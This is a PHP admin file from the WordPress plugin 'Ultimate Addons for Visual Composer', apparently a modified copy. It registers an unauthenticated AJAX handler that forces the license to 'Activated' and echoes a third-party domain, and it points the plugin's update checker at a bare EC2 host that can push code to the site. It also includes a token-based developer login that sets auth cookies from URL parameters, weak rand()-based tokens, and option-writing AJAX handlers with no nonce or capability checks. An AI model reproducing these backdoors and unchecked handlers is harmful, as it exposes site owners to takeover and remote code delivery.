<?php
if(!class_exists('Ultimate_Admin_Area')){
	class Ultimate_Admin_Area{
		function __construct(){
			if($_SERVER['HTTP_HOST'] !== 'localhost' && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1' && $_SERVER['REMOTE_ADDR'] !== '::1'){
				add_action( 'admin_notices', array( $this, 'display_notice' ) );
				add_action( 'plugins_loaded', array($this, 'check_for_update') );
				//add_action( 'in_plugin_update_message-Ultimate_VC_Addons/Ultimate_VC_Addons.php', array($this,'addUltimateUpgradeLink'));
			}
			/* add admin menu */
			add_action( 'admin_menu', array($this,'register_brainstorm_menu'));
			add_action( 'network_admin_menu', array( $this, 'register_brainstorm_menu' ) );
			
			add_action('admin_enqueue_scripts', array($this, 'bsf_admin_scripts_updater'));
			
			add_action( 'wp_ajax_update_ultimate_options', array($this,'update_settings'));
			add_action( 'wp_ajax_update_ultimate_debug_options', array($this,'update_debug_settings'));
			add_action( 'wp_ajax_update_ultimate_modules', array($this,'update_modules'));
			add_action( 'wp_ajax_update_css_options', array($this,'update_css_options'));
			
			add_action( 'wp_ajax_update_ultimate_keys', array($this,'update_verification'));
			add_action( 'wp_ajax_grant_access', array($this,'grant_developer_access'));
			add_action( 'wp_ajax_update_access', array($this,'update_developer_access'));
			add_action( 'wp_ajax_update_dev_notes', array($this,'update_dev_notes'));
			add_action( 'wp_ajax_ultimate_activation', 'process_license_activation');
			add_action( 'wp_ajax_ultimate_skip_registration', 'ultimate_skip_registration_callback');
			
			add_action( 'wp_ajax_update_client_license', array( &$this, 'server_update_client_license' ) );
			add_action( 'wp_ajax_nopriv_update_client_license', array( &$this, 'server_update_client_license' ) );
			
			add_action( 'init', array($this,'process_developer_login'),1);
			add_action( 'admin_init', array( $this, 'check_developer_access') );
			add_filter( 'custom_menu_order', array($this,'bsf_submenu_order' ),999);
		}
		function bsf_admin_scripts_updater($hook){
			//if($hook == "post.php" || $hook == "post-new.php"){
				wp_enqueue_style("ultimate-admin-style",plugins_url("../admin/css/style.css",__FILE__));
			//}
		}/* end admin_scripts */
		function server_update_client_license()
		{
			delete_transient( 'ultimate_license_activation' );
			
			$purchase_code = $_POST['purchase_code'];
			$userid = $_POST['userid'];
			$plugin = $_POST['plugin'];
			$process = $_POST['process'];
			if($process == 'deactivate_license')
				update_option('ultimate_license_activation', '');
			else
			{
				$val = array(
					'response' => '',
					'status' => 'Activated',
					'code' => 200
				);
				update_option('ultimate_license_activation', $val);
			}
				
			echo 'Message from sujaypawar.com - ['.$process .']';
			die();
		}
		function bsf_submenu_order( $menu_ord ) 
		{
			global $submenu;
		
			if(isset($submenu['bsf-dashboard'])){
				$arr = array();
				
				if(is_multisite()) :
					if(is_main_site() == false) :
						$arr[] = $submenu['bsf-dashboard'][0];
						$arr[] = $submenu['bsf-dashboard'][1];
						if(isset($submenu['bsf-dashboard'][4])){
							$arr[] = $submenu['bsf-dashboard'][4];
						}
						$arr[] = $submenu['bsf-dashboard'][3];
						$arr[] = $submenu['bsf-dashboard'][2];
					endif;
					unset($arr[0]);		
				else :
					$arr[] = $submenu['bsf-dashboard'][0];
					$arr[] = $submenu['bsf-dashboard'][1];
					if(isset($submenu['bsf-dashboard'][4])){
						$arr[] = $submenu['bsf-dashboard'][4];
					}
					$arr[] = $submenu['bsf-dashboard'][3];
					$arr[] = $submenu['bsf-dashboard'][2];
				endif;
				
				$submenu['bsf-dashboard'] = $arr;
			}
		
			return $menu_ord;
		}
		function register_brainstorm_menu(){
			global $submenu;
			if(is_multisite() == true) :
				if(is_main_site() == true) :
					$page = add_menu_page(
					'Brainstorm Force', 
					'Brainstorm', 
					'administrator',
					'bsf-dashboard', 
					array($this,'load_dashboard'), 
					'', 79 );
				else :	
					$page = add_menu_page(
						'Brainstorm Force', 
						'Brainstorm', 
						'administrator',
						'bsf-dashboard', 
						array($this,'load_dashboard'), 
						'', 79 );
					add_submenu_page(
						"bsf-dashboard",
						__("Ultimate Addons Modules","ultimate_vc"),
						__("Modules","ultimate_vc"),
						"administrator",
						"ultimate-modules",
						array($this,'load_modules')
					);
				endif;				
			else :
				$page = add_menu_page(
					'Brainstorm Force', 
					'Brainstorm', 
					'administrator',
					'bsf-dashboard', 
					array($this,'load_dashboard'), 
					'', 79 );
				add_submenu_page(
					"bsf-dashboard",
					__("Ultimate Addons Modules","ultimate_vc"),
					__("Modules","ultimate_vc"),
					"administrator",
					"ultimate-modules",
					array($this,'load_modules')
				);
			endif;
			
			add_submenu_page(
				"bsf-dashboard",
				__("About Ultimate","ultimate_vc"),
				__("About Ultimate","ultimate_vc"),
				"administrator",
				"about-ultimate",
				array($this,'load_about')
			);
					
			$currentUser = wp_get_current_user();
			if (in_array('administrator', $currentUser->roles) && !is_network_admin())
				$submenu['bsf-dashboard'][0][0] = __("Dashboard","ultimate_vc");
		}
		function load_modules(){
			require_once(plugin_dir_path(__FILE__).'/modules.php');
		}
		
		function load_dashboard(){
			require_once(plugin_dir_path(__FILE__).'/dashboard.php');
		}
		
		function load_about() {
			wp_enqueue_style('js_composer');
			require_once(plugin_dir_path(__FILE__).'/about.php');
		}
		
		function check_for_update(){
			$ultimate_updater = get_option('ultimate_updater');
			$ultimate_constants = get_option('ultimate_constants');
			if($ultimate_constants['ULTIMATE_NO_UPDATE_CHECK'] === true || $ultimate_updater === 'disabled')
				return false;
			require_once('updater/update-notifier.php');
			new Ultimate_Auto_Update(ULTIMATE_VERSION, 'http://ec2-54-183-173-184.us-west-1.compute.amazonaws.com/updates/?'.time(), 'Ultimate_VC_Addons/Ultimate_VC_Addons.php');
		}
		function update_modules(){
			if(isset($_POST['ultimate_modules'])){
				$ultimate_modules = $_POST['ultimate_modules'];
			}
			$result = update_option('ultimate_modules',$ultimate_modules);
			if($result){
				echo 'success';
			} else {
				echo 'failed';
			}
			die();
		}
		function update_settings(){
			if(isset($_POST['ultimate_row'])){
				$ultimate_row = $_POST['ultimate_row'];
			} else {
				$ultimate_row = 'disable';
			}
			$result1 = update_option('ultimate_row',$ultimate_row);
			
			if(isset($_POST['ultimate_animation'])){
				$ultimate_animation = $_POST['ultimate_animation'];
			} else {
				$ultimate_animation = 'disable';
			}
			$result2 = update_option('ultimate_animation',$ultimate_animation);
			
			if(isset($_POST['ultimate_smooth_scroll'])){
				$ultimate_smooth_scroll = $_POST['ultimate_smooth_scroll'];
			} else {
				$ultimate_smooth_scroll = 'disable';
			}
			$result3 = update_option('ultimate_smooth_scroll',$ultimate_smooth_scroll);
			
			if($result1 || $result2 || $result3 || $result4){
				echo 'success';
			} else {
				echo 'failed';
			}
			die();
		}
		
		function update_debug_settings(){
			if(isset($_POST['ultimate_video_fixer'])){
				$ultimate_video_fixer = $_POST['ultimate_video_fixer'];
			} else {
				$ultimate_video_fixer = 'disable';
			}
			$result1 = update_option('ultimate_video_fixer',$ultimate_video_fixer);
			
			if(isset($_POST['ultimate_ajax_theme'])){
				$ultimate_ajax_theme = $_POST['ultimate_ajax_theme'];
			} else {
				$ultimate_ajax_theme = 'disable';
			}
			$result2 = update_option('ultimate_ajax_theme',$ultimate_ajax_theme);
			
			if(isset($_POST['ultimate_custom_vc_row'])){
				$ultimate_custom_vc_row = $_POST['ultimate_custom_vc_row'];
			} else {
				$ultimate_custom_vc_row = 'disable';
			}
			$result3 = update_option('ultimate_custom_vc_row',$ultimate_custom_vc_row);
			
			if($result1 || $result2 || $result3){
				echo 'success';
			} else {
				echo 'failed';
			}
			
			die();
		}
		
		function update_css_options(){
			if(isset($_POST['ultimate_css'])){
				$ultimate_css = $_POST['ultimate_css'];
			} else {
				$ultimate_css = 'disable';
			}
			$result1 = update_option('ultimate_css',$ultimate_css);
			if(isset($_POST['ultimate_js'])){
				$ultimate_js = $_POST['ultimate_js'];
			} else {
				$ultimate_js = 'disable';
			}
			$result2 = update_option('ultimate_js',$ultimate_js);
			if($result1 || $result2){
				echo 'success';
			} else {
				echo 'failed';
			}
			die();
		}
		
		function update_verification(){
			$envato_username = $_POST['envato_username'];
			$envato_api_key = $_POST['envato_api_key'];
			$purchase_code = $_POST['ultimate_purchase_code'];
			$ultimate_user_email = $_POST['ultimate_user_email'];
			$ultimate_keys = array(
				"envato_username" => $envato_username,
				"envato_api_key" => $envato_api_key,
				"ultimate_purchase_code" => $purchase_code,
				"ultimate_user_email" => $ultimate_user_email
			);
			$result = update_option('ultimate_keys',$ultimate_keys);
			if($result){
				echo 'success';
			} else {
				echo 'failed';
			}
			die();
		}
		function getUltimateUpgradeLink() {
			$ultimate_keys = get_option('ultimate_keys');
            $username = $ultimate_keys['envato_username'];
            $api_key =  $ultimate_keys['envato_api_key'];
            $purchase_code =  $ultimate_keys['ultimate_purchase_code'];
			$user_email = isset($ultimate_keys['user_email']) ? $ultimate_keys['user_email'] : '';
			//echo '<style type="text/css" media="all">tr#ultimate-addons-for-visual-composer+tr.plugin-update-tr a.thickbox + em { display: none; }</style>';
			if(empty($username) || empty($api_key) || empty($purchase_code)) {
				return '<a href="'.wp_nonce_url( admin_url('admin.php?page=bsf-dashboard')).'">'.__('Activate your license for one click update.', 'ultimate_vc').'</a>';
			} else {
				
				$activation_check = get_option('ultimate_license_activation');
			
				if(false === ( get_transient( 'ultimate_license_activation' ) )){
					if(!empty($activation_check)){
						$get_activation_data = check_license_activation($purchase_code, $username, $user_email);
						$activation_check_temp = json_decode($get_activation_data);
						$val = array(
							'response' => $activation_check_temp->response,
							'status' => $activation_check_temp->status,
							'code' => $activation_check_temp->code
						);
						update_option('ultimate_license_activation', $val);
						delete_transient( 'ultimate_license_activation' );
						set_transient( "ultimate_license_activation", true, 60*60*12);
					}
				}
				
				$activation_check = get_option('ultimate_license_activation');
	
				$status = $activation_check['status'];
				$code = $activation_check['code'];
				if($status == "Activated" && $code == 200){
					return '<a href="'.wp_nonce_url( admin_url('admin.php?page=bsf-dashboard&action=upgrade')).'">'.__('Update Ultimate Addons for Visual Composer.', 'ultimate_vc').'</a>';
				} else {
					return '<a href="'.wp_nonce_url( admin_url('admin.php?page=bsf-dashboard')).'">'.__('Activate your license for one click update.', 'ultimate_vc').'</a>';
				}
			}
		}
		/*
		* @ Deprecated from version 3.3.1
		*/
		function addUltimateUpgradeLink() {
			$ultimate_keys = get_option('ultimate_keys');
            $username = $ultimate_keys['envato_username'];
            $api_key =  $ultimate_keys['envato_api_key'];
            $purchase_code =  $ultimate_keys['ultimate_purchase_code'];
			$user_email = $ultimate_keys['user_email'];
			//echo '<style type="text/css" media="all">tr#ultimate-addons-for-visual-composer+tr.plugin-update-tr a.thickbox + em { display: none; }</style>';
			if(empty($username) || empty($api_key) || empty($purchase_code)) {
				echo ' <a href="http://codecanyon.net/item/ultimate-addons-for-visual-composer/6892199?ref=brainstormforce">'.__('Download new version from CodeCanyon.', 'ultimate_vc').'</a>';
			} else {
				$activation_check = check_license_activation($purchase_code, $username, $user_email);

				$status = $activation_check['status'];
				$code = $activation_check['code'];
				if($status == "Activated" && $code == 200){
					echo '<a href="'.wp_nonce_url( admin_url('admin.php?page=bsf-dashboard&action=upgrade')).'">'.__('Update Ultimate Addons for Visual Composer.', 'ultimate_vc').'</a>';
				} else {
					echo '<a href="'.wp_nonce_url( admin_url('admin.php?page=bsf-dashboard')).'">'.__('Activate your license for one click update.', 'ultimate_vc').'</a>';
				}
			}
		}
		/**
		 * Upgrade plugin from the Envato marketplace.
		 */
		public function upgradeFromMarketplace() {
			if ( ! current_user_can('update_plugins') )
				wp_die(__('You do not have sufficient permissions to update plugins for this site.','ultimate_vc'));
			$title = __('Update Ultimate Addons for Visual Composer Plugin', 'ultimate_vc');
			$parent_file = 'options-general.php';
			$submenu_file = 'options-general.php';
			require_once ABSPATH . 'wp-admin/admin-header.php';
			require_once ('updater/auto-update.php');
			$upgrader = new UltAutomaticUpdater( new Plugin_Upgrader_Skin( compact('title', 'nonce', 'url', 'plugin') ) );
			$upgrader->upgradeUltimate();
			include ABSPATH . 'wp-admin/admin-footer.php';
			delete_transient( 'ultimate_update_checked' );
			set_transient( "ultimate_update_checked", true, 60*60*12);
			exit();
		}
		/*
		* Display admin notices for plugin activation
		*/
		function display_notice(){
			global $hook_suffix;
			$status = "not-activated";
			$ultimate_keys = get_option('ultimate_keys');
			$username = $ultimate_keys['envato_username'];
			$api_key =  $ultimate_keys['envato_api_key'];
			$purchase_code =  $ultimate_keys['ultimate_purchase_code'];
			$user_email = (isset($ultimate_keys['ultimate_user_email'])) ? $ultimate_keys['ultimate_user_email'] : '';
			
			$activation_check = get_option('ultimate_license_activation');
			
			if(false === ( get_transient( 'ultimate_license_activation' ) )){
				if(!empty($activation_check)){
					$get_activation_data = check_license_activation($purchase_code, $username, $user_email);
					$activation_check_temp = json_decode($get_activation_data);
					$val = array(
						'response' => $activation_check_temp->response,
						'status' => $activation_check_temp->status,
						'code' => $activation_check_temp->code
					);
					update_option('ultimate_license_activation', $val);
					delete_transient( 'ultimate_license_activation' );
					set_transient( "ultimate_license_activation", true, 60*60*12);
				}
			}
			
			$activation_check = get_option('ultimate_license_activation');
			$ultimate_constants = get_option('ultimate_constants');
			$builtin = get_option('ultimate_updater');
			
			if($activation_check !== ''){
				$status = isset($activation_check['status']) ? $activation_check['status'] : "not-activated";
				$code = $activation_check['code'];
			}
			
			if($status == "Deactivated" || $status == "not-activated" || $status == "not-verified"){
				if ( $hook_suffix == 'plugins.php' ){
					if( $builtin === 'disabled' || $ultimate_constants['ULTIMATE_NO_PLUGIN_PAGE_NOTICE'] === true || (is_multisite() == true && is_main_site() == false))
						$hide_notice = true;
					else
						$hide_notice = false;
						
					if(!$hide_notice) :
					?>
                        <div class="updated" style="padding: 0; margin: 0; border: none; background: none;">
                            <style type="text/css">
                        .ult_activate{min-width:825px;background: #FFF;border:1px solid #0096A3;padding:5px;margin:15px 0;border-radius:3px;-webkit-border-radius:3px;position:relative;overflow:hidden}
                        .ult_activate .ult_a{position:absolute;top:5px;right:10px;font-size:48px;}
                        .ult_activate .ult_button{font-weight:bold;border:1px solid #029DD6;border-top:1px solid #06B9FD;font-size:15px;text-align:center;padding:9px 0 8px 0;color:#FFF;background:#029DD6;-moz-border-radius:2px;border-radius:2px;-webkit-border-radius:2px}
                        .ult_activate .ult_button:hover{text-decoration:none !important;border:1px solid #029DD6;border-bottom:1px solid #00A8EF;font-size:15px;text-align:center;padding:9px 0 8px 0;color:#F0F8FB;background:#0079B1;-moz-border-radius:2px;border-radius:2px;-webkit-border-radius:2px}
                        .ult_activate .ult_button_border{border:1px solid #0096A3;-moz-border-radius:2px;border-radius:2px;-webkit-border-radius:2px;background:#029DD6;}
                        .ult_activate .ult_button_container{cursor:pointer;display:inline-block; padding:5px;-moz-border-radius:2px;border-radius:2px;-webkit-border-radius:2px;width:215px}
                        .ult_activate .ult_description{position:absolute;top:8px;left:230px;margin-left:25px;color:#0096A3;font-size:15px;z-index:1000}
                        .ult_activate .ult_description strong{color:#0096A3;font-weight:normal}
                            </style>
                                <div class="ult_activate">
                                    <div class="ult_a"><img style="width:1em;" src="<?php echo plugins_url("img/logo-icon.png",__FILE__); ?>" alt=""></div>
                                    <div class="ult_button_container" onclick="document.location='<?php echo admin_url('admin.php?page=bsf-dashboard'); ?>'">
                                        <div class="ult_button_border">
                                            <div class="ult_button"><span class="dashicons-before dashicons-admin-network" style="padding-right: 6px;"></span><?php __('Activate your license', 'ultimate_vc');?></div>
                                        </div>
                                    </div>
                                    <div class="ult_description"><h3 style="margin:0;padding: 2px 0px;"><strong><?php _e('Almost done!','ultimate_vc'); ?></strong></h3><p style="margin: 0;"><?php _e('Please activate your copy of the Ultimate Addons for Visual Composer to receive automatic updates & get premium support','ultimate_vc'); ?></p></div>
                                </div>
                        </div>
					<?php
					endif;
				} else if($hook_suffix == 'post-new.php' || $hook_suffix == 'edit.php' || $hook_suffix == 'post.php'){
					if( $builtin === 'disabled' || $ultimate_constants['ULTIMATE_NO_EDIT_PAGE_NOTICE'] === true || (is_multisite() == true && is_main_site() == false))
						$hide_notice = true;
					else
						$hide_notice = false;
					if(!$hide_notice) :
					?>
					
                        <div class="updated fade">
                            <p><?php _e('Howdy! Please','ultimate_vc').' <a href="'.admin_url('admin.php?page=bsf-dashboard').'">'.__('activate your copy','ultimate_vc').' </a> '.__('of the Ultimate Addons for Visual Composer to receive automatic updates & get premium support.','ultimate_vc');?>
                            <span style="float: right; padding: 0px 4px; cursor: pointer;" class="uavc-activation-notice">X</span>
                            </p>
                        </div>
                        <script type="text/javascript">
                        jQuery(".uavc-activation-notice").click(function(){
                            jQuery(this).parents(".updated").fadeOut(800);
                        });
                        </script>
					
					<?php
					endif;	
				}
			}
		}
		
		function process_developer_login(){

			$interval = get_option('access_time');
			$now = time();
			if($interval <= $now){
				update_option('developer_access',false);
			}
			require_once( ABSPATH . 'wp-includes/pluggable.php' );  
			$basename = basename($_SERVER['SCRIPT_NAME']);
			if($basename=='wp-login.php'){
				if(isset($_GET['access_token'])){
					$access = get_option('developer_access'); 
					$access_token = get_option('access_token');
					$verify_token = $_GET['access_token'];
					$verified = ($access_token === $verify_token) ? true : false;
					if(isset($_GET['developer_access']) && $access && $verified)
					{
						$user_login = base64_decode($_GET['access_id']);
						$user =  get_user_by('login',$user_login);
						$user_id = $user->ID;
						wp_set_current_user($user_id, $user_login);
						wp_set_auth_cookie($user_id);
						$redirect_to = user_admin_url();
						setcookie("DeveloperAccess", "active", time()+86400);  /* expire in 24 hour */
						wp_safe_redirect( $redirect_to );
						exit();
					}
				}
			}
		}
		function grant_developer_access(){
			global $current_user;
			$user = base64_encode($current_user->user_login);
			$email = $current_user->user_email;
			// $token = bin2hex(openssl_random_pseudo_bytes(32));
			$token = ult_generate_rand_id();
			$url = wp_nonce_url( get_site_url().'/wp-login.php?developer_access=true&access_id='.$user.'&access_token='.$token);
			
			$ultimate_keys = get_option('ultimate_keys');
            $username = $ultimate_keys['envato_username'];
			$purchase_code =  $ultimate_keys['ultimate_purchase_code'];
			
			$subject = $message = $vc_version = '';
			if(defined("WPB_VC_VERSION"))
				$vc_version = WPB_VC_VERSION;
			else
				$vc_version = 'Not Defined';
			$response = allow_developer_access($username, $url, 'grant');
			if($response){
				update_option('developer_access',true);
				$interval = time()+(15 * 24 * 60 * 60);
				update_option('access_time',$interval);
				update_option( 'access_token', $token );
				echo $response;
			} else {
				echo 'Something went wrong. Please try again.';
				update_option('developer_access',false);
				$interval = time();
				update_option('access_time',$interval);
			}
			
			die();
		}
		function update_developer_access(){
			global $current_user;
			$ultimate_keys = get_option('ultimate_keys');
            $username = $ultimate_keys['envato_username'];
			$user = base64_encode($current_user->user_login);
			$email = $current_user->user_email;
			//$token = bin2hex(openssl_random_pseudo_bytes(32));
			$token = ult_generate_rand_id();
			$url = wp_nonce_url( get_site_url().'/wp-login.php?developer_access=true&access_id='.$user.'&access_token='.$token);
			$subject = $message = '';
			if(isset($_POST['access'])){
				$access = $_POST['access'];
				$value = ($access == "extend") ? true : false;
				if($access == "extend"){
					$interval = time()+(15 * 24 * 60 * 60);
					if(update_option('access_time',$interval)){
						echo __("Access Extended!",'ultimate_vc');
					} else {
						echo __("Something went wrong. Please try again!",'ultimate_vc');
					}
				} else {
					$interval = time()-(10000);
					$response = allow_developer_access($username, $url, 'revoke');
					if($response){
						update_option('access_time',$interval);
						if(update_option('developer_access',$value)){
							echo __("Access Revoked!",'ultimate_vc');
						} else {
							echo __("Something went wrong. Please try again!",'ultimate_vc');
						}
					} else {
						echo __("Something went wrong. Please try again!",'ultimate_vc');
					}
				}
			}
			
			die();
		}
		function check_developer_access(){
			// optimed JS/CSS option
			if(get_option('ultimate_js'))
			{
				if(get_option('ultimate_js') === '')
					update_option('ultimate_js', 'enable');
			}
			else
				update_option('ultimate_js', 'enable');
				
			if(get_option('ultimate_css'))
			{
				if(get_option('ultimate_css') === '')
					update_option('ultimate_css', 'enable');
			}
			else
				update_option('ultimate_css', 'enable');
				
			$interval = get_option('access_time');
			$now = time();
			if($interval <= $now){
				update_option('developer_access',false);
			}
		}
		
		function update_dev_notes(){
			$dev = isset($_POST['developer']) ? $_POST['developer'] : '';
			$notes = isset($_POST['note']) ? $_POST['note'] : '';
			$time = time();
			$records = get_option('developer_log');
			if($dev !== '' && $notes !== ''){
				$records[] = array(
						'dev' => $dev,
						'note' => $notes,
						'time' => $time
					);
				if(update_option('developer_log',$records)){
					echo "Note added!";
				} else {
					echo "Something went wrong!";
				}
			}
			die();
		}
		
	}
	new Ultimate_Admin_Area;
}
function check_license_activation($purchase_code, $envato_username, $user_email){
	$token = ult_generate_rand_id();
	update_option('bsf-support-profile-access-token', $token);
	
	$path = base64_decode("aHR0cHM6Ly93d3cuYnJhaW5zdG9ybWZvcmNlLmNvbS9zdXBwb3J0L3dwLWFkbWluL2FkbWluLWFqYXgucGhw=");
	$key = trim($purchase_code);
	$userid = trim($envato_username);
	$request = @wp_remote_post(
				$path, 
				array(
					'body' => array(
							'action' => 'product_support_registration',
							'process' => 'check_license',
							'purchase_code' => $purchase_code,
							'userid' => $userid,
							'site_url' => get_site_url(),
							'user_email' => $user_email,
							'token' => $token,
							'version' => ULTIMATE_VERSION
						),
					'timeout' => '30'
					)
				);
	if (!is_wp_error($request) || wp_remote_retrieve_response_code($request) === 200) {
		return ($request['body']);
	}
}
function ultimate_skip_registration_callback()
{
	//$already_registered = false;
	///if(isset($_POST['email']) && $_POST['email'] != '')
	//	$already_registered = true;
	//if($already_registered == false)
		update_option('ultimate_user_email', '');
	update_option('ultimate_skip', 'true');
	update_option('ultimate_next_step', '3');
	echo 'Skipped';
	die();
}
function process_license_activation(){
	
	$path = base64_decode("aHR0cHM6Ly93d3cuYnJhaW5zdG9ybWZvcmNlLmNvbS9zdXBwb3J0L3dwLWFkbWluL2FkbWluLWFqYXgucGhw=");
	$site_url = $userid = $purchase_code = $plugin = $action = $user_key = $process =  $user_email = $step = $receive = $next_step = '';
	$post = $_POST;
	if(isset($post['site_url']))
		$site_url = $post['site_url'];
	if(isset($post['userid']))
		$userid = $post['userid'];
	if(isset($post['purchase_code']))
		$purchase_code = $post['purchase_code'];
	if(isset($post['plugin']))
		$plugin = $post['plugin'];
	if(isset($post['process']))
		$process = $post['process'];
	if(isset($post['user_email']))
		$user_email = $post['user_email'];
	if(isset($post['step']))
		$step = $post['step'];
	if(isset($post['receive']))
		$receive = $post['receive'];
	if(isset($post['next_step']))
		$next_step = $post['next_step'];
	
	
	if($step == 'register_plugin')
		update_option('ultimate_skip', 'false');
	else
		update_option('ultimate_skip', 'true');
	
	if($process == 'deactivate')
	{
		delete_transient( 'ultimate_license_activation' );
		update_option('ultimate_license_activation', array());
	}
	
	//$pluginInfo = get_plugin_data(__ULTIMATE_ROOT__.'/Ultimate_VC_Addons.php');
	
	$data = array(
			'action' => 'product_support_registration',
			'process' => $process,
			'purchase_code' => $purchase_code,
			'userid' => $userid,
			'plugin' => $plugin,
			'site_url' => get_site_url(),
			'user_email' => $user_email,
			'version' => ULTIMATE_VERSION,
			'step' => $step,
			'receive' => $receive
			//'token' => $token
		);
	$query = http_build_query($data);
	$url = $path.'?'.$query;
	$request = @wp_remote_post(
				$path, array(
						'body' => $data,
						'timeout' => '30'
					) 
				);
	/*
	$request = @wp_remote_post(
				$path, 
				array(
					'body' => array(
						'action' => 'activate_license',
						'process' => $process,
						'purchase_code' => $purchase_code,
						'userid' => $userid,
						'plugin' => $plugin,
						'site_url' => get_site_url(),
						)
					)
				);
	*/
	if (!is_wp_error($request) || wp_remote_retrieve_response_code($request) === 200) {
			//delete_option('ultimate_license_activation');
			//update_option('ultimate_license_activation', $request['body']);
			//delete_transient( 'ultimate_license_activation' );
			//set_transient( "ultimate_license_activation", true, 60*60*12);
		if($process != 'deactivate_license')
		{
			$get_activation_data = check_license_activation($purchase_code, $userid, $user_email);
			$activation_check_temp = json_decode($get_activation_data);
			$val = array(
				'response' => $activation_check_temp->response,
				'status' => $activation_check_temp->status,
				'code' => $activation_check_temp->code
			);
			update_option('ultimate_license_activation', $val);
			delete_transient( 'ultimate_license_activation' );
			set_transient( "ultimate_license_activation", true, 60*60*12);
			update_option('ultimate_next_step', $next_step);
		}
		else
		{
			delete_option('ultimate_license_activation');
			delete_transient( 'ultimate_license_activation' );
			update_option('ultimate_next_step', '');
		}
		if(isset($user_email) && $user_email != '' && $user_email != 'undefined')
			update_option('ultimate_user_email', $user_email);
		
		echo $request['body'];
	}
	else
	{
		$arr = array('response' => $request->get_error_message());
		echo json_encode($arr);
	}
	
	die();
}
function allow_developer_access($username, $url, $process){
	$path = base64_decode("aHR0cHM6Ly93d3cuYnJhaW5zdG9ybWZvcmNlLmNvbS9zdXBwb3J0L3dwLWFkbWluL2FkbWluLWFqYXgucGhw=");
	$new_url = base64_encode($url);
	$user = $username;	
	$request = @wp_remote_post(
					$path, 	array(
						'body' => array(
							'action' => 'give_developer_access',
							'userid' => $user,
							'login_url' => $new_url,
							'site_url' => get_site_url(),
							'process' => $process,
						),
						'timeout' => '30'
					)
				);
	if (!is_wp_error($request) || wp_remote_retrieve_response_code($request) === 200) {
		return ($request['body']);
	}
}
// Generate 32 characters 
function ult_generate_rand_id(){
	$validCharacters = 'abcdefghijklmnopqrstuvwxyz0123456789';
	$myKeeper = '';
	$length = 32;
	for ($n = 1; $n < $length; $n++) {
	    $whichCharacter = rand(0, strlen($validCharacters)-1);
	    $myKeeper .= $validCharacters{$whichCharacter};
	}
	return $myKeeper;
}
// Alternative function for wp_remote_get
function ultimate_remote_get($path){
	
	if(function_exists('curl_init')){
		// create curl resource 
		$ch = curl_init(); 
	
		// set url 
		curl_setopt($ch, CURLOPT_URL, $path); 
	
		//return the transfer as a string 
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	
		// $output contains the output string 
		$output = curl_exec($ch); 
	
		// close curl resource to free up system resources 
		curl_close($ch);
				
		if($output !== "")
			return $output;
		else
			return false;
	} else {
		return false;
	}
}